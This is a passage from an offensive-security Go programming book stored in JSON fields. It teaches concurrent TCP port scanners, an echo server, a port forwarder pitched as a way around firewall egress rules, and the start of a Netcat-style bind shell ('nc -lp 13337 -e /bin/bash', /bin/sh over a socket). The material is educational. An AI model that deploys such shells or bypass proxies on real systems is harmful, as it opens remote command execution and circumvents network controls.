    "output": "external system that’s allowed through the firewall (for\nexample, stacktitan.com), that employee can leverage the\nallowed domain to bounce connections to evil.com. Figure 2-2\nillustrates this concept.\nFigure 2-1: A TCP proxy\nA client connects, through a firewall, to the destination host\nstacktitan.com. This host is configured to forward connections\nto the host evil.com. While a firewall forbids direct\nconnections to evil.com, a configuration such as the one shown\nhere could allow a client to circumvent this protection\nmechanism and access evil.com.\nYou can use port forwarding to exploit several restrictive\nnetwork configurations. For example, you could forward\ntraffic through a jump box to access a segmented network or\naccess ports bound to restrictive interfaces.\nWRITING A TCP SCANNER\nOne effective way to conceptualize the interaction of TCP\nports is by implementing a port scanner. By writing one, you’ll\nobserve the steps that occur in a TCP handshake, along with\nthe effects of encountered state changes, which allow you to\ndetermine whether a TCP port is available or whether it\nresponds with a closed or filtered state.\nHivaNetwork.Com\nOnce you’ve written a basic scanner, you’ll write one that’s\nfaster. A port scanner may scan several ports by using a single\ncontiguous method; however, this can become time-\nconsuming when your goal is to scan all 65,535 ports. You’ll\nexplore how to use concurrency to make an inefficient port\nscanner more suitable for larger port-scanning tasks.\nYou’ll also be able to apply the concurrency patterns that\nyou’ll learn in this section in many other scenarios, both in this\nbook and beyond.\nTesting for Port Availability\nThe first step in creating the port scanner is understanding how\nto initiate a connection from a client to a server. Throughout\nthis example, you’ll be connecting to and scanning\nscanme.nmap.org, a service run by the Nmap project.1 To do\nthis, you’ll use Go’s net package: net.Dial(network, address string).\nThe first argument is a string that identifies the kind of\nconnection to initiate. This is because Dial isn’t just for TCP; it\ncan be used for creating connections that use Unix sockets,\nUDP, and Layer 4 protocols that exist only in your head (the\nauthors have been down this road, and suffice it to say, TCP is\nvery good). There are a few strings you can provide, but for\nthe sake of brevity, you’ll use the string tcp.\nThe second argument tells Dial(network, address string) the host\nto which you wish to connect. Notice it’s a single string, not a\nstring and an int. For IPv4/TCP connections, this string will take\nthe form of host:port. For example, if you wanted to connect to\nscanme.nmap.org on TCP port 80, you would supply\nscanme.nmap.org:80.\nNow you know how to create a connection, but how will\nyou know if the connection is successful? You’ll do this\nthrough error checking: Dial(network, address string) returns Conn and\nerror, and error will be nil if the connection is successful. So, to\nverify your connection, you just check whether error equals nil.\nYou now have all the pieces needed to build a single port\nscanner, albeit an impolite one. Listing 2-1 shows how to put it\ntogether. (All the code listings at the root location of / exist\nunder the provided github repo https://github.com/blackhat-\ngo/bhg/.)\npackage main\nimport (\n\"fmt\"\n\"net\"\n)\nfunc main() {\n_, err := net.Dial(\"tcp\", \"scanme.nmap.org:80\")\nif err == nil {\nfmt.Println(\"Connection successful\")\n}\n}\nListing 2-1: A basic port scanner that scans only one port (/ch-2/dial/main.go)\nRun this code. You should see Connection successful, provided\nyou have access to the great information superhighway.\nPerforming Nonconcurrent Scanning\nScanning a single port at a time isn’t useful, and it certainly\nisn’t efficient. TCP ports range from 1 to 65535; but for\ntesting, let’s scan ports 1 to 1024. To do this, you can use a for\nloop:\nfor i:=1; i <= 1024; i++ {\nfor i:=1; i <= 1024; i++ {\n}\nNow you have an int, but remember, you need a string as\nthe second argument to Dial(network, address string). There are at\nleast two ways to convert the integer into a string. One way is\nto use the string conversion package, strconv. The other way is\nto use Sprintf(format string, a ...interface{}) from the fmt package,\nwhich (similar to its C sibling) returns a string generated from a\nformat string.\nCreate a new file with the code in Listing 2-2 and ensure\nthat both your loop and string generation work. Running this\ncode should print 1024 lines, but don’t feel obligated to count\nthem.\npackage main\nimport (\n\"fmt\"\n)\nfunc main() {\nfor i := 1; i <= 1024; i++ {\naddress := fmt.Sprintf(\"scanme.nmap.org:%d\", i)\nfmt.Println(address)\n}\n}\nListing 2-2: Scanning 1024 ports of scanme.nmap.org (/ch-2/tcp-scanner-\nslow/main.go)\nAll that’s left is to plug the address variable from the\nprevious code example into Dial(network, address string), and\nimplement the same error checking from the previous section\nto test port availability. You should also add some logic to\nclose the connection if it was successful; that way, connections\naren’t left open. FINishing your connections is just polite. To\ndo that, you’ll call Close() on Conn. Listing 2-3 shows the\ncompleted port scanner.\npackage main\nimport (\n\"fmt\"\n\"net\"\n)\nfunc main() {\nfor i := 1; i <= 1024; i++ {\naddress := fmt.Sprintf(\"scanme.nmap.org:%d\", i)\nconn, err := net.Dial(\"tcp\", address)\nif err != nil {\n// port is closed or filtered.\ncontinue\n}\nconn.Close()\nfmt.Printf(\"%d open\\n\", i)\n}\n}\nListing 2-3: The completed port scanner (/ch-2/tcp-scanner-slow/main.go)\nCompile and execute this code to conduct a light scan\nagainst the target. You should see a couple of open ports.\nPerforming Concurrent Scanning\nThe previous scanner scanned multiple ports in a single go\n(pun intended). But your goal now is to scan multiple ports\nconcurrently, which will make your port scanner faster. To do\nthis, you’ll harness the power of goroutines. Go will let you\ncreate as many goroutines as your system can handle, bound\nonly by available memory.\nThe “Too Fast” Scanner Version\nThe most naive way to create a port scanner that runs\nconcurrently is to wrap the call to Dial(network, address string) in a\ngoroutine. In the interest of learning from natural\nconsequences, create a new file called scan-too-fast.go with\nthe code in Listing 2-4 and execute it.\npackage main\nimport (\n\"fmt\"\n\"net\"\n)\nfunc main() {\nfor i := 1; i <= 1024; i++ {\ngo func(j int) {\naddress := fmt.Sprintf(\"scanme.nmap.org:%d\", j)\nconn, err := net.Dial(\"tcp\", address)\nif err != nil {\nreturn\n}\nconn.Close()\nfmt.Printf(\"%d open\\n\", j)\n}(i)\n}\n}\nListing 2-4: A scanner that works too fast (/ch-2/tcp-scanner-too-fast/main.go)\nUpon running this code, you should observe the program\nexiting almost immediately:\n$ time ./tcp-scanner-too-fast\n./tcp-scanner-too-fast 0.00s user 0.00s system 90% cpu 0.004 total\nThe code you just ran launches a single goroutine per\nconnection, and the main goroutine doesn’t know to wait for\nthe connection to take place. Therefore, the code completes\nand exits as soon as the for loop finishes its iterations, which\nmay be faster than the network exchange of packets between\nyour code and the target ports. You may not get accurate\nresults for ports whose packets were still in-flight.\nThere are a few ways to fix this. One is to use WaitGroup\nfrom the sync package, which is a thread-safe way to control\nconcurrency. WaitGroup is a struct type and can be created like\nso:\nvar wg sync.WaitGroup\nOnce you’ve created WaitGroup, you can call a few methods\non the struct. The first is Add(int), which increases an internal\ncounter by the number provided. Next, Done() decrements the\ncounter by one. Finally, Wait() blocks the execution of the\ngoroutine in which it’s called, and will not allow further\nexecution until the internal counter reaches zero. You can\ncombine these calls to ensure that the main goroutine waits for\nall connections to finish.\nSynchronized Scanning Using WaitGroup\nListing 2-5 shows the same port-scanning program with a\ndifferent implementation of the goroutines.\npackage main\nimport (\n\"fmt\"\n\"net\"\n\"sync\"\n)\nfunc main() {\n❶ var wg sync.WaitGroup\nfor i := 1; i <= 1024; i++ {\n❷ wg.Add(1)\ngo func(j int) {\n❸ defer wg.Done()\naddress := fmt.Sprintf(\"scanme.nmap.org:%d\", j)\nconn, err := net.Dial(\"tcp\", address)\nif err != nil {\nreturn\n}\nconn.Close()\nfmt.Printf(\"%d open\\n\", j)\n}(i)\n}\n❹ wg.Wait()\n}\nListing 2-5: A synchronized scanner that uses WaitGroup (/ch-2/tcp-scanner-wg-too-\nfast/main.go)\nThis iteration of the code remains largely identical to our\ninitial version. However, you’ve added code that explicitly\ntracks the remaining work. In this version of the program, you\ncreate sync.WaitGroup ❶, which acts as a synchronized counter.\nYou increment this counter via wg.Add(1) each time you create a\ngoroutine to scan a port ❷, and a deferred call to wg.Done()\ndecrements the counter whenever one unit of work has been\nperformed ❸. Your main() function calls wg.Wait(), which blocks\nuntil all the work has been done and your counter has returned\nto zero ❹.\nThis version of the program is better, but still incorrect. If\nyou run this multiple times against multiple hosts, you might\nsee inconsistent results. Scanning an excessive number of\nhosts or ports simultaneously may cause network or system\nlimitations to skew your results. Go ahead and change 1024 to\n65535, and the destination server to your localhost 127.0.0.1 in\nyour code. If you want, you can use Wireshark or tcpdump to\nsee how fast those connections are opened.\nPort Scanning Using a Worker Pool\nTo avoid inconsistencies, you’ll use a pool of goroutines to\nmanage the concurrent work being performed. Using a for\nloop, you’ll create a certain number of worker goroutines as a\nresource pool. Then, in your main() “thread,” you’ll use a\nchannel to provide work.\nTo start, create a new program that has 100 workers,\nconsumes a channel of int, and prints them to the screen. You’ll\nstill use WaitGroup to block execution. Create your initial code\nstub for a main function. Above it, write the function shown in\nListing 2-6.\nfunc worker(ports chan int, wg *sync.WaitGroup) {\nfor p := range ports {\nfmt.Println(p)\nwg.Done()\n}\n}\nListing 2-6: A worker function for processing work\nThe worker(int, *sync.WaitGroup) function takes two arguments: a\nchannel of type int and a pointer to a WaitGroup. The channel will\nbe used to receive work, and the WaitGroup will be used to track\nwhen a single work item has been completed.\nNow, add your main() function shown in Listing 2-7, which\nwill manage the workload and provide work to your worker(int,\n*sync.WaitGroup) function.\npackage main\nimport (\n\"fmt\"\n\"sync\"\n)\nfunc worker(ports chan int, wg *sync.WaitGroup) {\n❶ for p := range ports {\nfmt.Println(p)\nwg.Done()\n}\n}\nfunc main() {\nports := make❷(chan int, 100)\nvar wg sync.WaitGroup\n❸ for i := 0; i < cap(ports); i++ {\ngo worker(ports, &wg)\n}\nfor i := 1; i <= 1024; i++ {\nwg.Add(1)\n❹ ports <- i\n}\nwg.Wait()\n❺ close(ports)\n}\nListing 2-7: A basic worker pool (/ch-2/tcp-sync-scanner/main.go)\nFirst, you create a channel by using make() ❷. A second\nparameter, an int value of 100, is provided to make() here. This\nallows the channel to be buffered, which means you can send\nit an item without waiting for a receiver to read the item.\nBuffered channels are ideal for maintaining and tracking work\nfor multiple producers and consumers. You’ve capped the\nchannel at 100, meaning it can hold 100 items before the\nsender will block. This is a slight performance increase, as it\nwill allow all the workers to start immediately.\nNext, you use a for loop ❸ to start the desired number of\nworkers—in this case, 100. In the worker(int, *sync.WaitGroup)\nfunction, you use range ❶ to continuously receive from the ports\nchannel, looping until the channel is closed. Notice that you\naren’t doing any work yet in the worker—that’ll come shortly.\nIterating over the ports sequentially in the main() function, you\nsend a port on the ports channel ❹ to the worker. After all the\nwork has been completed, you close the channel ❺.\nOnce you build and execute this program, you’ll see your\nnumbers printed to the screen. You might notice something\ninteresting here: the numbers are printed in no particular order.\nWelcome to the wonderful world of parallelism.\nMultichannel Communication\nTo complete the port scanner, you could plug in your code\nfrom earlier in the section, and it would work just fine.\nHowever, the printed ports would be unsorted, because the\nscanner wouldn’t check them in order. To solve this problem,\nyou need to use a separate thread to pass the result of the port\nscan back to your main thread to order the ports before\nprinting. Another benefit of this modification is that you can\nremove the dependency of a WaitGroup entirely, as you’ll have\nanother method of tracking completion. For example, if you\nscan 1024 ports, you’re sending on the worker channel 1024\ntimes, and you’ll need to send the result of that work back to\nthe main thread 1024 times. Because the number of work units\nHivaNetwork.Com\nsent and the number of results received are the same, your\nprogram can know when to close the channels and\nsubsequently shut down the workers.\nThis modification is demonstrated in Listing 2-8, which\ncompletes the port scanner.\npackage main\nimport (\n\"fmt\"\n\"net\"\n\"sort\"\n)\n❶ func worker(ports, results chan int) {\nfor p := range ports {\naddress := fmt.Sprintf(\"scanme.nmap.org:%d\", p)\nconn, err := net.Dial(\"tcp\", address)\nif err != nil {\n❷ results <- 0\ncontinue\n}\nconn.Close()\n❸ results <- p\n}\n}\nfunc main() {\nports := make(chan int, 100)\n❹ results := make(chan int)\n❺ var openports []int\nfor i := 0; i < cap(ports); i++ {\ngo worker(ports, results)\n}\n❻ go func() {\nfor i := 1; i <= 1024; i++ {\nports <- i\n}\n}()\n❼ for i := 0; i < 1024; i++ {\nport := <-results\nif port != 0 {\nopenports = append(openports, port)\n}\n}\nclose(ports)\nclose(results)\n❽ sort.Ints(openports)\nfor _, port := range openports {\nfmt.Printf(\"%d open\\n\", port)\n}\n}\nListing 2-8: Port scanning with multiple channels (/ch-2/tcp-scanner-final/main.go)\nThe worker(ports, results chan int) function has been modified to\naccept two channels ❶; the remaining logic is mostly the\nsame, except that if the port is closed, you’ll send a zero ❷,\nand if it’s open, you’ll send the port ❸. Also, you create a\nseparate channel to communicate the results from the worker\nto the main thread ❹. You then use a slice ❺ to store the\nresults so you can sort them later. Next, you need to send to\nthe workers in a separate goroutine ❻ because the result-\ngathering loop needs to start before more than 100 items of\nwork can continue.\nThe result-gathering loop ❼ receives on the results channel\n1024 times. If the port doesn’t equal 0, it’s appended to the\nslice. After closing the channels, you’ll use sort ❽ to sort the\nslice of open ports. All that’s left is to loop over the slice and\nprint the open ports to screen.\nThere you have it: a highly efficient port scanner. Take"
  },
  {
    "input": "Building a TCP Proxy",
    "output": "some time to play around with the code—specifically, the\nnumber of workers. The higher the count, the faster your\nprogram should execute. But if you add too many workers,\nyour results could become unreliable. When you’re writing\ntools for others to use, you’ll want to use a healthy default\nvalue that caters to reliability over speed. However, you\nshould also allow users to provide the number of workers as an\noption.\nYou could make a couple of improvements to this program.\nFirst, you’re sending on the results channel for every port\nscanned, and this isn’t necessary. The alternative requires code\nthat is slightly more complex as it uses an additional channel\nnot only to track the workers, but also to prevent a race\ncondition by ensuring the completion of all gathered results.\nAs this is an introductory chapter, we purposefully left this\nout; but don’t worry! We’ll introduce this pattern in Chapter 3.\nSecond, you might want your scanner to be able to parse port-\nstrings—for example, 80,443,8080,21-25, like those that can be\npassed to Nmap. If you want to see an implementation of this,\nsee https://github.com/blackhat-go/bhg/blob/master/ch-\n2/scanner-port-format/. We’ll leave this as an exercise for you\nto explore.\nBUILDING A TCP PROXY\nYou can achieve all TCP-based communications by using\nGo’s built-in net package. The previous section focused\nprimarily on using the net package from a client’s perspective,\nand this section will use it to create TCP servers and transfer\ndata. You’ll begin this journey by building the requisite echo\nserver—a server that merely echoes a given response back to a\nclient—followed by two much more generally applicable\nprograms: a TCP port forwarder and a re-creation of Netcat’s\n“gaping security hole” for remote command execution.\nUsing io.Reader and io.Writer\nTo create the examples in this section, you need to use two\nsignificant types that are crucial to essentially all input/output\n(I/O) tasks, whether you’re using TCP, HTTP, a filesystem, or\nany other means: io.Reader and io.Writer. Part of Go’s built-in io\npackage, these types act as the cornerstone to any data\ntransmission, local or networked. These types are defined in\nGo’s documentation as follows:\ntype Reader interface {\nRead(p []byte) (n int, err error)\n}\ntype Writer interface {\nWrite(p []byte) (n int, err error)\n}\nBoth types are defined as interfaces, meaning they can’t be\ndirectly instantiated. Each type contains the definition of a\nsingle exported function: Read or Write. As explained in Chapter\n1, you can think of these functions as abstract methods that\nmust be implemented on a type for it to be considered a Reader\nor Writer. For example, the following contrived type fulfills this\ncontract and can be used anywhere a Reader is accepted:\ntype FooReader struct {}\nfunc (fooReader *FooReader) Read(p []byte) (int, error) {\n// Read some data from somewhere, anywhere.\nreturn len(dataReadFromSomewhere), nil\n}\nThis same idea applies to the Writer interface:\ntype FooWriter struct {}\nfunc (fooWriter *FooWriter) Write(p []byte) (int, error) {\n// Write data somewhere.\nreturn len(dataWrittenSomewhere), nil\n}\nLet’s take this knowledge and create something semi-\nusable: a custom Reader and Writer that wraps stdin and stdout.\nThe code for this is a little contrived since Go’s os.Stdin and\nos.Stdout types already act as Reader and Writer, but then you\nwouldn’t learn anything if you didn’t reinvent the wheel every\nnow and again, would you?\nListing 2-9 shows a full implementation, and an\nexplanation follows.\npackage main\nimport (\n\"fmt\"\n\"log\"\n\"os\"\n)\n// FooReader defines an io.Reader to read from stdin.\n❶ type FooReader struct{}\n// Read reads data from stdin.\n❷ func (fooReader *FooReader) Read(b []byte) (int, error) {\nfmt.Print(\"in > \")\nreturn os.Stdin.Read(b)❸\n}\n// FooWriter defines an io.Writer to write to Stdout.\n❹ type FooWriter struct{}\n// Write writes data to Stdout.\n❺ func (fooWriter *FooWriter) Write(b []byte) (int, error) {\nfmt.Print(\"out> \")\nreturn os.Stdout.Write(b)❻\n}\nfunc main() {\n// Instantiate reader and writer.\nvar (\nreader FooReader\nwriter FooWriter\n)\n// Create buffer to hold input/output.\n❼ input := make([]byte, 4096)\n// Use reader to read input.\ns, err := reader.Read(input)❽\nif err != nil {\nlog.Fatalln(\"Unable to read data\")\n}\nfmt.Printf(\"Read %d bytes from stdin\\n\", s)\n// Use writer to write output.\ns, err = writer.Write(input)❾\nif err != nil {\nlog.Fatalln(\"Unable to write data\")\n}\nfmt.Printf(\"Wrote %d bytes to stdout\\n\", s)\n}\nListing 2-9: A reader and writer demonstration (/ch-2/io-example/main.go)\nThe code defines two custom types: FooReader ❶ and\nFooWriter ❹. On each type, you define a concrete\nimplementation of the Read([]byte) function ❷ for FooReader and\nthe Write([]byte) function ❺ for FooWriter. In this case, both\nfunctions are reading from stdin ❸ and writing to stdout ❻.\nNote that the Read functions on both FooReader and os.Stdin\nreturn the length of data and any errors. The data itself is\ncopied into the byte slice passed to the function. This is\nconsistent with the Reader interface prototype definition\nprovided earlier in this section. The main() function creates that\nslice (named input) ❼ and then proceeds to use it in calls to\nFooReader.Read([]byte) ❽ and FooReader.Write([]byte) ❾.\nA sample run of the program produces the following:\n$ go run main.go\nin > hello world!!!\nRead 15 bytes from stdin\nout> hello world!!!\nWrote 4096 bytes to stdout\nCopying data from a Reader to a Writer is a fairly common\npattern—so much so that Go’s io package contains a Copy()\nfunction that can be used to simplify the main() function. The\nfunction prototype is as follows:\nfunc Copy(dst io.Writer, src io.Reader) (written int64, error)\nThis convenience function allows you to achieve the same\nprogrammatic behavior as before, replacing your main()\nfunction with the code in Listing 2-10.\nfunc main() {\nvar (\nreader FooReader\nwriter FooWriter\n)\nif _, err := io.Copy(&writer, &reader)❶; err != nil {\nlog.Fatalln(\"Unable to read/write data\")\n}\n}\nListing 2-10: Using io.Copy (/ch-2/copy-example/main.go)\nNotice that the explicit calls to reader.Read([]byte) and\nwriter.Write([]byte) have been replaced with a single call to\nio.Copy(writer, reader) ❶. Under the covers, io.Copy(writer, reader) calls\nthe Read([]byte) function on the provided reader, triggering the\nFooReader to read from stdin. Subsequently, io.Copy(writer, reader)\ncalls the Write([]byte) function on the provided writer, resulting\nin a call to your FooWriter, which writes the data to stdout.\nEssentially, io.Copy(writer, reader) handles the sequential read-then-\nwrite process without all the petty details.\nThis introductory section is by no means a comprehensive\nlook at Go’s I/O and interfaces. Many convenience functions\nand custom readers and writers exist as part of the standard Go\npackages. In most cases, Go’s standard packages contain all\nthe basic implementations to achieve the most common tasks.\nIn the next section, let’s explore how to apply these\nfundamentals to TCP communications, eventually using the\npower vested in you to develop real-life, usable tools.\nCreating the Echo Server\nAs is customary for most languages, you’ll start by building an\necho server to learn how to read and write data to and from a\nsocket. To do this, you’ll use net.Conn, Go’s stream-oriented\nnetwork connection, which we introduced when you built a\nport scanner. Based on Go’s documentation for the data type,\nConn implements the Read([]byte) and Write([]byte) functions as\ndefined for the Reader and Writer interfaces. Therefore, Conn is\nboth a Reader and a Writer (yes, this is possible). This makes\nsense logically, as TCP connections are bidirectional and can\nbe used to send (write) or receive (read) data.\nAfter creating an instance of Conn, you’ll be able to send\nand receive data over a TCP socket. However, a TCP server\ncan’t simply manufacture a connection; a client must establish\na connection. In Go, you can use net.Listen(network, address string) to\nfirst open a TCP listener on a specific port. Once a client\nconnects, the Accept() method creates and returns a Conn object\nthat you can use for receiving and sending data.\nListing 2-11 shows a complete example of a server\nimplementation. We’ve included comments inline for clarity.\nDon’t worry about understanding the code in its entirety, as\nwe’ll break it down momentarily.\npackage main\nimport (\n\"log\"\n\"net\"\n)\n// echo is a handler function that simply echoes received data.\nfunc echo(conn net.Conn) {\ndefer conn.Close()\n// Create a buffer to store received data.\nb := make([]byte, 512)\n❶ for {\n// Receive data via conn.Read into a buffer.\nsize, err := conn.Read❷(b[0:])\nif err == io.EOF {\nlog.Println(\"Client disconnected\")\nbreak\n}\nif err != nil {\nlog.Println(\"Unexpected error\")\nbreak\n}\nlog.Printf(\"Received %d bytes: %s\\n\", size, string(b))\n// Send data via conn.Write.\nlog.Println(\"Writing data\")\nif _, err := conn.Write❸(b[0:size]); err != nil {\nlog.Fatalln(\"Unable to write data\")\n}\n}\n}\nfunc main() {\n// Bind to TCP port 20080 on all interfaces.\n❹ listener, err := net.Listen(\"tcp\", \":20080\")\nif err != nil {\nlog.Fatalln(\"Unable to bind to port\")\n}\nlog.Println(\"Listening on 0.0.0.0:20080\")\n❺ for {\n// Wait for connection. Create net.Conn on connection established.\n❻ conn, err := listener.Accept()\nlog.Println(\"Received connection\")\nif err != nil {\nlog.Fatalln(\"Unable to accept connection\")\n}\n// Handle the connection. Using goroutine for concurrency.\n❼ go echo(conn)\n}\n}\nListing 2-11: A basic echo server (/ch-2/echo-server/main.go)\nListing 2-11 begins by defining a function named\necho(net.Conn), which accepts a Conn instance as a parameter. It\nbehaves as a connection handler to perform all necessary I/O.\nThe function loops indefinitely ❶, using a buffer to read ❷\nand write ❸ data from and to the connection. The data is read\ninto a variable named b and subsequently written back on the\nHivaNetwork.Com\nconnection.\nNow you need to set up a listener that will call your\nhandler. As mentioned previously, a server can’t manufacture\na connection but must instead listen for a client to connect.\nTherefore, a listener, defined as tcp bound to port 20080, is\nstarted on all interfaces by using the net.Listen(network, address\nstring) function ❹.\nNext, an infinite loop ❺ ensures that the server will\ncontinue to listen for connections even after one has been\nreceived. Within this loop, you call listener.Accept() ❻, a function\nthat blocks execution as it awaits client connections. When a\nclient connects, this function returns a Conn instance. Recall\nfrom earlier discussions in this section that Conn is both a Reader\nand a Writer (it implements the Read([]byte) and Write([]byte)\ninterface methods).\nThe Conn instance is then passed to the echo(net.Conn) handler\nfunction ❼. This call is prefaced with the go keyword, making\nit a concurrent call so that other connections don’t block while\nwaiting for the handler function to complete. This is likely\noverkill for such a simple server, but we’ve included it again\nto demonstrate the simplicity of Go’s concurrency pattern, in\ncase it wasn’t already clear. At this point, you have two\nlightweight threads running concurrently:\nThe main thread loops back and blocks on listener.Accept() while it awaits\nanother connection.\nThe handler goroutine, whose execution has been transferred to the\necho(net.Conn) function, proceeds to run, processing the data.\nThe following shows an example using Telnet as the\nconnecting client:\n$ telnet localhost 20080\nTrying 127.0.0.1...\nConnected to localhost.\nEscape character is '^]'.\ntest of the echo server\ntest of the echo server\nThe server produces the following standard output:\n$ go run main.go\n2020/01/01 06:22:09 Listening on 0.0.0.0:20080\n2020/01/01 06:22:14 Received connection\n2020/01/01 06:22:18 Received 25 bytes: test of the echo server\n2020/01/01 06:22:18 Writing data\nRevolutionary, right? A server that repeats back to the\nclient exactly what the client sent to the server. What a useful\nand exciting example! It’s quite a time to be alive.\nImproving the Code by Creating a Buffered Listener\nThe example in Listing 2-11 works perfectly fine but relies on\nfairly low-level function calls, buffer tracking, and iterative\nreads/writes. This is a somewhat tedious, error-prone process.\nFortunately, Go contains other packages that can simplify this\nprocess and reduce the complexity of the code. Specifically,\nthe bufio package wraps Reader and Writer to create a buffered I/O\nmechanism. The updated echo(net.Conn) function is detailed here,\nand an explanation of the changes follows:\nfunc echo(conn net.Conn) {\ndefer conn.Close()\n❶ reader := bufio.NewReader(conn)\ns, err := reader.ReadString('\\n')❷\nif err != nil {\nlog.Fatalln(\"Unable to read data\")\n}\nlog.Printf(\"Read %d bytes: %s\", len(s), s)\nlog.Println(\"Writing data\")\n❸ writer := bufio.NewWriter(conn)\nif _, err := writer.WriteString(s)❹; err != nil {\nlog.Fatalln(\"Unable to write data\")\n}\n❺ writer.Flush()\n}\nNo longer are you directly calling the Read([]byte) and\nWrite([]byte) functions on the Conn instance; instead, you’re\ninitializing a new buffered Reader and Writer via\nNewReader(io.Reader) ❶ and NewWriter(io.Writer) ❸. These calls both\ntake, as a parameter, an existing Reader and Writer (remember,\nthe Conn type implements the necessary functions to be\nconsidered both a Reader and a Writer).\nBoth buffered instances contain complementary functions\nfor reading and writing string data. ReadString(byte) ❷ takes a\ndelimiter character used to denote how far to read, whereas\nWriteString(byte) ❹ writes the string to the socket. When writing\ndata, you need to explicitly call writer.Flush() ❺ to flush write all\nthe data to the underlying writer (in this case, a Conn instance).\nAlthough the previous example simplifies the process by\nusing buffered I/O, you can reframe it to use the Copy(Writer,\nReader) convenience function. Recall that this function takes as\ninput a destination Writer and a source Reader, simply copying\nfrom source to destination.\nIn this example, you’ll pass the conn variable as both the\nsource and destination because you’ll be echoing the contents\nback on the established connection:\nfunc echo(conn net.Conn) {\ndefer conn.Close()\n// Copy data from io.Reader to io.Writer via io.Copy().\nif _, err := io.Copy(conn, conn); err != nil {\nlog.Fatalln(\"Unable to read/write data\")\n}\n}\nYou’ve explored the basics of I/O and applied it to TCP\nservers. Now it’s time to move on to more usable, relevant\nexamples.\nProxying a TCP Client\nNow that you have a solid foundation, you can take what\nyou’ve learned up to this point and create a simple port\nforwarder to proxy a connection through an intermediary\nservice or host. As mentioned earlier in this chapter, this is\nuseful for trying to circumvent restrictive egress controls or to\nleverage a system to bypass network segmentation.\nBefore laying out the code, consider this imaginary but\nrealistic problem: Joe is an underperforming employee who\nworks for ACME Inc. as a business analyst making a\nhandsome salary based on slight exaggerations he included on\nhis resume. (Did he really go to an Ivy League school? Joe,\nthat’s not very ethical.) Joe’s lack of motivation is matched\nonly by his love for cats—so much so that Joe installed cat\ncameras at home and hosted a site, joescatcam.website,\nthrough which he could remotely monitor the dander-filled\nfluff bags. One problem, though: ACME is onto Joe. They\ndon’t like that he’s streaming his cat cam 24/7 in 4K ultra\nhigh-def, using valuable ACME network bandwidth. ACME\nhas even blocked its employees from visiting Joe’s cat cam\nwebsite.\nJoe has an idea. “What if I set up a port-forwarder on an\ninternet-based system I control,” Joe says, “and force the\nredirection of all traffic from that host to joescatcam.website?”\nJoe checks at work the following day and confirms he can\naccess his personal website, hosted at the joesproxy.com\ndomain. Joe skips his afternoon meetings, heads to a coffee\nshop, and quickly codes a solution to his problem. He’ll\nforward all traffic received at http://joesproxy.com to\nhttp://joescatcam.website.\nHere’s Joe’s code, which he runs on the joesproxy.com\nserver:\nfunc handle(src net.Conn) {\ndst, err := net.Dial(\"tcp\", \"joescatcam.website:80\")❶\nif err != nil {\nlog.Fatalln(\"Unable to connect to our unreachable host\")\n}\ndefer dst.Close()\n// Run in goroutine to prevent io.Copy from blocking\n❷ go func() {\n// Copy our source's output to the destination\nif _, err := io.Copy(dst, src)❸; err != nil {\nlog.Fatalln(err)\n}\n}()\n// Copy our destination's output back to our source\nif _, err := io.Copy(src, dst)❹; err != nil {\nlog.Fatalln(err)\n}\n}\nfunc main() {\n// Listen on local port 80\nlistener, err := net.Listen(\"tcp\", \":80\")\nif err != nil {\nlog.Fatalln(\"Unable to bind to port\")\n}\nfor {\nconn, err := listener.Accept()\nif err != nil {\nlog.Fatalln(\"Unable to accept connection\")\n}\ngo handle(conn)\n}\n}\nStart by examining Joe’s handle(net.Conn) function. Joe\nconnects to joescatcam.website ❶ (recall that this unreachable\nhost isn’t directly accessible from Joe’s corporate\nworkstation). Joe then uses Copy(Writer, Reader) two separate\ntimes. The first instance ❸ ensures that data from the inbound\nconnection is copied to the joescatcam.website connection.\nThe second instance ❹ ensures that data read from\njoescatcam.website is written back to the connecting client’s\nconnection. Because Copy(Writer, Reader) is a blocking function,\nand will continue to block execution until the network\nconnection is closed, Joe wisely wraps his first call to\nCopy(Writer, Reader) in a new goroutine ❷. This ensures that\nexecution within the handle(net.Conn) function continues, and the\nsecond Copy(Writer, Reader) call can be made.\nJoe’s proxy listens on port 80 and relays any traffic\nreceived from a connection to and from port 80 on\njoescatcam.website. Joe, that crazy and wasteful man,\nconfirms that he can connect to joescatcam.website via\njoesproxy.com by connecting with curl:\n$ curl -i -X GET http://joesproxy.com\nHTTP/1.1 200 OK\nDate: Wed, 25 Nov 2020 19:51:54 GMT\nServer: Apache/2.4.18 (Ubuntu)\nLast-Modified: Thu, 27 Jun 2019 15:30:43 GMT\nETag: \"6d-519594e7f2d25\"\nAccept-Ranges: bytes\nContent-Length: 109\nVary: Accept-Encoding\nContent-Type: text/html\n--snip--\nAt this point, Joe has done it. He’s living the dream,\nwasting ACME-sponsored time and network bandwidth while\nhe watches his cats. Today, there will be cats!\nReplicating Netcat for Command Execution\nIn this section, let’s replicate some of Netcat’s more\ninteresting functionality—specifically, its gaping security hole.\nNetcat is the TCP/IP Swiss Army knife—essentially, a\nmore flexible, scriptable version of Telnet. It contains a feature\nthat allows stdin and stdout of any arbitrary program to be\nredirected over TCP, enabling an attacker to, for example, turn\na single command execution vulnerability into operating\nsystem shell access. Consider the following:\n$ nc –lp 13337 –e /bin/bash\nThis command creates a listening server on port 13337.\nAny remote client that connects, perhaps via Telnet, would be\nable to execute arbitrary bash commands—hence the reason\nthis is referred to as a gaping security hole. Netcat allows you\nto optionally include this feature during program compilation.\n(For good reason, most Netcat binaries you’ll find on standard\nLinux builds do not include this feature.) It’s dangerous\nenough that we’ll show you how to create it in Go!\nFirst, look at Go’s os/exec package. You’ll use that for\nrunning operating system commands. This package defines a\ntype, Cmd, that contains necessary methods and properties to\nrun commands and manipulate stdin and stdout. You’ll\nredirect stdin (a Reader) and stdout (a Writer) to a Conn instance\n(which is both a Reader and a Writer).\nWhen you receive a new connection, you can use the\nCommand(name string, arg ...string) function from os/exec to create a\nnew Cmd instance. This function takes as parameters the\noperating system command and any arguments. In this\nexample, hardcode /bin/sh as the command and pass -i as an\nargument such that you’re in interactive mode, which allows\nyou to manipulate stdin and stdout more reliably:\ncmd := exec.Command(\"/bin/sh\", \"-i\")\nThis creates an instance of Cmd but doesn’t yet execute the\ncommand. You have a couple of options for manipulating\nstdin and stdout. You could use Copy(Writer, Reader) as discussed\npreviously, or directly assign Reader and Writer to Cmd. Let’s\ndirectly assign your Conn object to both cmd.Stdin and cmd.Stdout,\nlike so:\ncmd.Stdin = conn\ncmd.Stdout = conn\nWith the setup of the command and the streams complete,\nyou run the command by using cmd.Run():\nif err := cmd.Run(); err != nil {\nif err := cmd.Run(); err != nil {\n// Handle error.\n}\nThis logic works perfectly fine on Linux systems.\nHowever, when tweaking 